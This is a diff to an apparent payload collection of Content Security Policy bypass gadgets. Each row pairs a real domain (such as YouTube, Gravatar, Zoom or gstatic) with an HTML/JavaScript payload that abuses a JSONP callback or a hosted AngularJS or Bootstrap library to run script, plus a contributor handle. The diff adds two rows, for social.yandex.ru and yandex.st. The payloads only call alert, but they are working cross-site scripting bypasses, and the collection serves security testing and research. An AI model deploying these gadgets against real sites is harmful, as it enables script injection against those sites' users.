@@ -74,6 +74,7 @@ secure.adnxs.com	<script src="https://secure.adnxs.com/getuidp?callback=alert(1)
 secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>	
 secure.quantserve.com	<script src="https://secure.quantserve.com/api/segments.json?callback=alert"></script>	renniepak
 shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>	renniepak
+social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>	notdenied
 soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>	renniepak
 ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
 st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	renniepak
@@ -117,6 +118,7 @@ www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{asse
 www.yastat.net	<body ng-app ng-csp><script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Panya
 www.yastatic.net	<body ng-app ng-csp><script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Panya
 www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>	
+yandex.st	<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test XSS</button>	notdenied
 yastat.net	<body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Panya
 yastatic.net	<body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	Panya
 yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	
